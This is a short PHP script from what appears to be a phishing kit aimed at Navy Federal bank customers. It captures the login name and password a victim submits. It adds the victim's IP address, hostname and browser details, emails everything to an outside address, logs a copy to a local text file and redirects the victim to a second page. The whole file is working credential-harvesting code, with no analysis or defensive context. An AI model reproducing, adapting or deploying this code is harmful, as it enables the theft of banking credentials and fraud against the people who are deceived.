<?php 
$Ok= "rezultsowner@yandex.ru"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$fuck  = "------=nAvY Info=------\n";
$fuck .= "Access Number : ".$_POST['username']."\n";
$fuck .= "Password : ".$_POST['password']."\n";
$fuck .= "------=Ip & Hostname Info=------\n";
$fuck .= "Client IP : ".$ip."\n";
$fuck .= "HostName : ".$hostname."\n";
$fuck .= "Date And Time : ".$date."\n";
$fuck .= "Browser Details : ".$user_agent."\n";
$fuck .= "------Shaun MiLi------\n";
$subject = "nAvY $ip";
$headers = "From: nAvY <r2d4@approject.com>";
mail($Ok,$subject,$fuck,$headers);
$fp = fopen("1.txt","a");
fputs($fp,$fuck);
fclose($fp);
Header ("Location: index2.php");
?>